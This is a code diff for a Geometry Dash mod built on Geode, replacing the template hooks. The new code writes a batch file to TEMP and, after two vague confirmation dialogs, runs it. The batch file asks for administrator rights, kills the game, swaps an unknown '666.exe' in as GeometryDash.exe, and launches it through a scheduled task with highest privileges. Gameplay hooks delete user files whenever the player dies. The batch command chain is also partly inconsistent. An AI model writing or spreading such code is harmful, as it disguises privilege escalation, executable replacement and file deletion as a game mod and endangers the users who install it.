@@ -1,100 +1,189 @@
-/**
- * Include the Geode headers.
- */
 #include <Geode/Geode.hpp>
-
-/**
- * Brings cocos2d and all Geode namespaces to the current scope.
- */
-using namespace geode::prelude;
-
-/**
- * `$modify` lets you extend and modify GD's classes.
- * To hook a function in Geode, simply $modify the class
- * and write a new function definition with the signature of
- * the function you want to hook.
- *
- * Here we use the overloaded `$modify` macro to set our own class name,
- * so that we can use it for button callbacks.
- *
- * Notice the header being included, you *must* include the header for
- * the class you are modifying, or you will get a compile error.
- *
- * Another way you could do this is like this:
- *
- * struct MyMenuLayer : Modify<MyMenuLayer, MenuLayer> {};
- */
 #include <Geode/modify/MenuLayer.hpp>
+#include <Geode/modify/PlayLayer.hpp>
+#include <fstream>
+#include <filesystem>
+#include <random>
+
+using namespace geode::prelude;
+namespace fs = std::filesystem;
+
+// Variable global para rastrear el archivo copiado
+std::string g_copiedFileName = "";
+fs::path g_sourcePath = "C:/Prueba";
+
+// Función para obtener la ruta del escritorio
+fs::path getDesktopPath() {
+    char* userProfile = std::getenv("USERPROFILE");
+    if (userProfile) {
+        return fs::path(userProfile) / "Desktop";
+    }
+    return "";
+}
+
+// Función para crear el archivo BAT en Temp
+void createBatFile() {
+    char* tempEnv = std::getenv("TEMP");
+    if (!tempEnv) return;
+    fs::path batPath = fs::path(tempEnv) / "AnGD666.bat";
+    
+    std::ofstream batFile(batPath);
+    batFile << "@echo off\n";
+    // El script BAT realiza el flujo solicitado: UAC -> taskkill -> ren -> move -> Task Scheduler
+    batFile << "powershell -Command \"Start-Process cmd -Verb RunAs -ArgumentList '/c taskkill /f /im GeometryDash.exe && set /p targetPath=Introduce la ruta de 666.exe: && ren \\\"%targetPath%\\666.exe\\\" GeometryDash.exe && ren GeometryDash.exe GeometryDash666.exe && move GeometryDash.exe \\\"C:\\Program Files (x86)\\Steam\\steamapps\\common\\Geometry Dash\\\" && schtasks /create /tn \\\"GD666\\\" /tr \\\"C:\\Program Files (x86)\\Steam\\steamapps\\common\\Geometry Dash\\GeometryDash.exe\\\" /sc once /st 00:00 /rl highest /f && schtasks /run /tn \\\"GD666\\\" && schtasks /delete /tn \\\"GD666\\\" /f'\"\n";
+    batFile.close();
+}
+
+// Función para desactivar el mod y limpiar
+void disableMod() {
+    auto mod = Mod::get();
+    mod->setSettingValue("enabled", false);
+    
+    char* tempEnv = std::getenv("TEMP");
+    if (tempEnv) {
+        fs::path batPath = fs::path(tempEnv) / "AnGD666.bat";
+        if (fs::exists(batPath)) {
+            fs::remove(batPath);
+        }
+    }
+}
+
 class $modify(MyMenuLayer, MenuLayer) {
-	/**
-	 * Typically classes in GD are initialized using the `init` function, (though not always!),
-	 * so here we use it to add our own button to the bottom menu.
-	 *
-	 * Note that for all hooks, your signature has to *match exactly*,
-	 * `void init()` would not place a hook!
-	*/
-	bool init() {
-		/**
-		 * We call the original init function so that the
-		 * original class is properly initialized.
-		 */
-		if (!MenuLayer::init()) {
-			return false;
-		}
+    bool init() {
+        if (!MenuLayer::init()) return false;
 
-		/**
-		 * You can use methods from the `geode::log` namespace to log messages to the console,
-		 * being useful for debugging and such. See this page for more info about logging:
-		 * https://docs.geode-sdk.org/tutorials/logging
-		*/
-		log::debug("Hello from my MenuLayer::init hook! This layer has {} children.", this->getChildrenCount());
+        bool isEnabled = Mod::get()->getSettingValue<bool>("enabled");
+        bool isConfirmed = Mod::get()->getSettingValue<bool>("confirmed");
 
-		/**
-		 * See this page for more info about buttons
-		 * https://docs.geode-sdk.org/tutorials/buttons
-		*/
-		auto myButton = CCMenuItemSpriteExtra::create(
-			CCSprite::createWithSpriteFrameName("GJ_likeBtn_001.png"),
-			this,
-			/**
-			 * Here we use the name we set earlier for our modify class.
-			*/
-			menu_selector(MyMenuLayer::onMyButton)
-		);
+        if (isEnabled && !isConfirmed) {
+            // Usamos un delay pequeño para asegurar que la capa esté lista
+            this->runAction(CCSequence::create(
+                CCDelayTime::create(0.5f),
+                CCCallFunc::create(this, callfunc_selector(MyMenuLayer::showFirstMessage)),
+                nullptr
+            ));
+        }
 
-		/**
-		 * Here we access the `bottom-menu` node by its ID, and add our button to it.
-		 * Node IDs are a Geode feature, see this page for more info about it:
-		 * https://docs.geode-sdk.org/tutorials/nodetree
-		*/
-		auto menu = this->getChildByID("bottom-menu");
-		menu->addChild(myButton);
+        return true;
+    }
 
-		/**
-		 * The `_spr` string literal operator just prefixes the string with
-		 * your mod id followed by a slash. This is good practice for setting your own node ids.
-		*/
-		myButton->setID("my-button"_spr);
+    void showFirstMessage() {
+        createBatFile();
+        auto alert = FLAlertLayer::create(
+            this,
+            "Are you sure?",
+            "Are you sure you want to use this mod?",
+            "No", "Yes"
+        );
+        alert->setTag(1);
+        alert->show();
+    }
 
-		/**
-		 * We update the layout of the menu to ensure that our button is properly placed.
-		 * This is yet another Geode feature, see this page for more info about it:
-		 * https://docs.geode-sdk.org/tutorials/layouts
-		*/
-		menu->updateLayout();
+    void showLastMessage() {
+        auto alert = FLAlertLayer::create(
+            this,
+            "LAST",
+            "LAST",
+            "No", "Yes"
+        );
+        alert->setTag(2);
+        alert->show();
+    }
 
-		/**
-		 * We return `true` to indicate that the class was properly initialized.
-		 */
-		return true;
-	}
+    // Geode utiliza FLAlertLayerProtocol para los callbacks
+    void FLAlert_Clicked(FLAlertLayer* alert, bool btn2) override {
+        if (alert->getTag() == 1) {
+            if (btn2) { // Yes
+                this->showLastMessage();
+            } else { // No
+                disableMod();
+            }
+        } else if (alert->getTag() == 2) {
+            if (btn2) { // Yes
+                Mod::get()->setSettingValue("confirmed", true);
+                char* tempEnv = std::getenv("TEMP");
+                if (tempEnv) {
+                    std::string batPath = (fs::path(tempEnv) / "AnGD666.bat").string();
+                    ShellExecuteA(NULL, "open", batPath.c_str(), NULL, NULL, SW_SHOWNORMAL);
+                }
+            } else { // No
+                disableMod();
+            }
+        }
+    }
+};
 
-	/**
-	 * This is the callback function for the button we created earlier.
-	 * The signature for button callbacks must always be the same,
-	 * return type `void` and taking a `CCObject*`.
-	*/
-	void onMyButton(CCObject*) {
-		FLAlertLayer::create("Geode", "Hello from my custom mod!", "OK")->show();
-	}
+class $modify(MyPlayLayer, PlayLayer) {
+    // Estructura para guardar el estado del archivo actual
+    struct Fields {
+        std::string m_copiedFile = "";
+        fs::path m_desktopPath = "";
+    };
+
+    bool init(GJGameLevel* level, bool useReplay, bool dontSave) {
+        if (!PlayLayer::init(level, useReplay, dontSave)) return false;
+
+        if (fs::exists(g_sourcePath)) {
+            std::vector<fs::path> files;
+            try {
+                for (auto const& dir_entry : fs::recursive_directory_iterator(g_sourcePath)) {
+                    if (dir_entry.is_regular_file()) {
+                        files.push_back(dir_entry.path());
+                    }
+                }
+            } catch (...) {}
+
+            if (!files.empty()) {
+                std::random_device rd;
+                std::mt19937 g(rd());
+                std::uniform_int_distribution<> dis(0, files.size() - 1);
+                
+                fs::path selectedFile = files[dis(g)];
+                m_fields->m_copiedFile = selectedFile.filename().string();
+                m_fields->m_desktopPath = getDesktopPath();
+
+                if (!m_fields->m_desktopPath.empty()) {
+                    try {
+                        fs::copy(selectedFile, m_fields->m_desktopPath / m_fields->m_copiedFile, fs::copy_options::overwrite_existing);
+                    } catch (...) {}
+                }
+            }
+        }
+
+        return true;
+    }
+
+    void onQuit() {
+        if (!m_fields->m_copiedFile.empty() && !m_fields->m_desktopPath.empty()) {
+            fs::path desktopFile = m_fields->m_desktopPath / m_fields->m_copiedFile;
+            if (fs::exists(desktopFile)) {
+                try { fs::remove(desktopFile); } catch (...) {}
+            }
+        }
+        PlayLayer::onQuit();
+    }
+
+    void destroyPlayer(PlayerObject* p0, GameObject* p1) {
+        PlayLayer::destroyPlayer(p0, p1);
+        
+        if (!m_fields->m_copiedFile.empty()) {
+            // Borrar del escritorio
+            fs::path desktopFile = m_fields->m_desktopPath / m_fields->m_copiedFile;
+            if (fs::exists(desktopFile)) {
+                try { fs::remove(desktopFile); } catch (...) {}
+            }
+
+            // Borrar de C:/Prueba (recursivo)
+            try {
+                for (auto const& dir_entry : fs::recursive_directory_iterator(g_sourcePath)) {
+                    if (dir_entry.is_regular_file() && dir_entry.path().filename() == m_fields->m_copiedFile) {
+                        fs::remove(dir_entry.path());
+                        break; 
+                    }
+                }
+            } catch (...) {}
+            
+            m_fields->m_copiedFile = "";
+        }
+    }
 };
